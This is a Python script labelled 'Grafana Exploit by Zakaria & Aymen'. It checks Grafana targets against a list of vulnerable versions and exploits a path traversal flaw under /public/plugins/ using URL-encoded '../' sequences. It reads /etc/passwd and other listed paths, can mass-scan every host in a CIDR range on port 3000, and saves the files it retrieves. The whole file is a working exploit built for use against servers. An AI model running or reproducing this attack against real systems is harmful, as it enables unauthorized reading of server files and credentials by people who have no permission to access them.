import ipaddress
import os
from pathlib import Path
from urllib.request import urlopen
from bs4 import BeautifulSoup
import requests
from termcolor import colored


def check_vuln(target_list):
    vulnerable_v = ["8.0.0-beta1", "8.0.0-beta2", "8.0.0-beta3", "8.0.0", "8.0.1", "8.0.2", "8.0.3", "8.0.4", "8.0.5",
                    "8.0.6", "8.1.0-beta1", "8.1.0-beta2", "8.1.0-beta3", "8.1.0", "8.1.2", "8.1.3", "8.1.4", "8.1.5",
                    "8.1.6", "8.1.7", "8.2.0-beta1", "8.2.0-beta2", "8.2.0", "8.2.1", "8.2.2", "8.2.3", "8.2.4",
                    "8.2.5", "8.2.6", "8.3.0-beta1", "8.3.0-beta2", "8.3.0"]

    for target in target_list:
        try:
            soup = BeautifulSoup(urlopen(str(target)), features="lxml")
            scripts = []
            for script in soup.find_all('script'):
                scripts.append(script.contents)
            sc = scripts[2][0].split(";")[0].replace("window.grafanaBootData = {", "")[:-1]
            version = sc.split("version", 1)[1][3:8]
            if version in vulnerable_v:
                print(colored(f"Target {target} with version {version} is vulnerable", "green"))
            else:
                print(colored(f"Target {target} with version {version} is not vulnerable", "red"))
        except:
            print("Unavailble target")

if __name__ == "__main__":
    print("-----------------------------------------------------------------------------------------------------------")
    print(colored("Grafana Exploit by Zakaria & Aymen", 'blue'))
    print("-----------------------------------------------------------------------------------------------------------")

    # Open paths and payload list file
    payloads = open('payload.txt', 'r', encoding='utf-8').readlines()
    paths = open('paths.txt', 'r', encoding='utf-8').readlines()
    out_path = "outputs"
    vuln_payload = None

    testing_path = "/../../../../../../../../etc/passwd"
    # URL ENCODDING :  convert '.' to ascii
    testing_path = testing_path.replace(".", "%" + hex(ord("."))[2:])

    print("1) Apply the exploit for an input target ")
    print("2) Vulnerability checker for a list of targets (in target_list.txt) ")
    print("3) Apply the exploit for a list of targets (in target_list.txt) ")
    print("4) Apply the exploit for a list of targets (list of addresses from a CIDR) \n")

    mode = input("please select one of the options above : ")

    print(f'\n{"=" * 80}\n')

    target_list = []
    if mode == "1":  # Apply the exploit for a an input target
        target_list.append(input("Enter the domain of the target : "))

    elif mode == "2":  # Vulnerability checker for a list of targets
        target_list = open('target_list.txt', 'r', encoding='utf-8').read().splitlines()
        check_vuln(target_list)

    elif mode == "3":  # Apply the exploit for a list of targets (in target_list.txt)
        target_list = open('target_list.txt', 'r', encoding='utf-8').read().splitlines()

    elif mode == "4":  # Apply the exploit for a list of targets (list of addresses from a CIDR)
        ip_add = input("Enter ip_adress and the mask (ip@/mask) : ")
        net4 = ipaddress.ip_network(ip_add)
        for ip in net4.hosts():
            target_list.append("http://" + str(ip) + ":3000")


    i = 1
    # Read the list of targets
    if mode == "1" or mode == "3" or mode == "4" :
        print("The list of targets : ", target_list)
        for target in target_list:
            try:
                # Make output path for every target
                folder_name = "target_" + str(i)
                Path(out_path + "/" + folder_name).mkdir(parents=True, exist_ok=True)
                out_path = out_path + "/" + folder_name

                print(colored(f"Target {i}: {target}\n", "blue"))
                for payload in payloads:
                    url = f"{target}/public/plugins/{payload.strip()}" + testing_path
                    req = requests.get(url, timeout=(3, 10), allow_redirects=False, verify=False)

                    if req.status_code == 200:

                        print(colored(f"[!] Payload \"{url.strip()}\" works.\n", "green"))
                        vuln_payload = payload.strip()  # Set as vulnerable

                    else:
                        print(colored(f"[!] Payload \"{url.strip()}\" not works.\n", "red"))

                if vuln_payload is not None:
                    print(colored(f"[i] Analysing files...\n", "blue"))

                    found = {}

                    for path in paths:
                        # URL ENCODDING :  convert '..' to ascii ( .. ==> %2e%2e)
                        path = path.replace("..", "%" + hex(ord("."))[2:] + "%" + hex(ord("."))[2:])

                        path = path.strip()
                        url = f"{target}/public/plugins/{vuln_payload}{path}"

                        req = requests.get(url, timeout=(3, 10), allow_redirects=False, verify=False)

                        if req.status_code == 200:
                            print(colored(f"[i] File \"/{path.split('/')[-1]}\" found in server.", "red"))
                            out_file = os.path.join('.', out_path, path.split('/')[-1])
                            found[(path.split('/')[-1])] = out_file
                            with open(out_file, 'wb+') as fd:
                                fd.write(req.content)
                            print(colored(f"      [*] File saved in \"{out_file}\".\n", "green"))
            except:
                print("Unavailble target")

            i += 1
            out_path = "outputs"  # ReINIT path
            print(f'\n{"=" * 80}\n')
